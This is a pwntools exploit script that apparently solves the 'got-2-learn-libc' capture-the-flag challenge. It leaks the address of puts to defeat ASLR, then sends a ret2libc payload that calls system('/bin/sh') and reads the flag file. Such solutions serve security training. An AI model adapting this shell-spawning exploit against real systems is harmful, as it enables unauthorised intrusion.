from pwn import *

padding = "A" * 160
sys_libc = 0x0003a940
exit_libc = 0x0002e7b0
binsh_libc = 0x0015902b
puts_libc = 0x0005f140

p = process('/problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee/vuln')
p.recvuntil('puts: ')
vuln_puts = int(p.recvline().strip('\n'),16)

base = vuln_puts - puts_libc

sys = p32(sys_libc + base)
ext = p32(exit_libc + base)
binsh = p32(binsh_libc + base)

log.info("System: " + sys)
log.info("Exit: " + ext)
log.info("/bin/sh: " + binsh)

payload = padding + sys + ext + binsh

p.recv()
p.sendline(payload)
p.sendline('cat /problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee/flag.txt')
p.interactive()
